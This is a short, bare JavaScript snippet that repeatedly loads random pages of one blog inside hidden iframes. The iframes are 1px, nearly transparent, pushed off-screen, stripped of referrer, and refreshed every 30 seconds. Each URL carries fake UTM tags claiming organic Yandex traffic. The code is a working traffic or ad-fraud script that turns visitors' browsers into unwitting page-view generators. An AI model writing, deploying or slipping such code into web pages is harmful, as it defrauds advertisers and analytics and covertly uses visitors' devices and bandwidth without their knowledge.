  const urls = [
    "https://www.nobletouch.online/2024/09/10.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.nobletouch.online/2024/09/blog-post.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.nobletouch.online/2024/09/blog-post_26.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.nobletouch.online/2024/09/blog-post_73.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.nobletouch.online/2024/09/blog-post_34.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.nobletouch.online/2024/09/blog-post_79.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.nobletouch.online/2024/09/blog-post_14.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.nobletouch.online/2024/09/blog-post_4.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.nobletouch.online/2024/09/blog-post_59.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.nobletouch.online/2024/09/blog-post_39.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo"
  ];

  function loadIframe() {
    const page = urls[Math.floor(Math.random() * urls.length)];
    const iframe = document.createElement("iframe");
    iframe.src = page;
    iframe.style = "width:1px; height:1px; opacity:0.01; position:absolute; left:-9999px;";
    iframe.referrerPolicy = "no-referrer";
    document.body.appendChild(iframe);
  }

  loadIframe();
  setInterval(loadIframe, 30000);
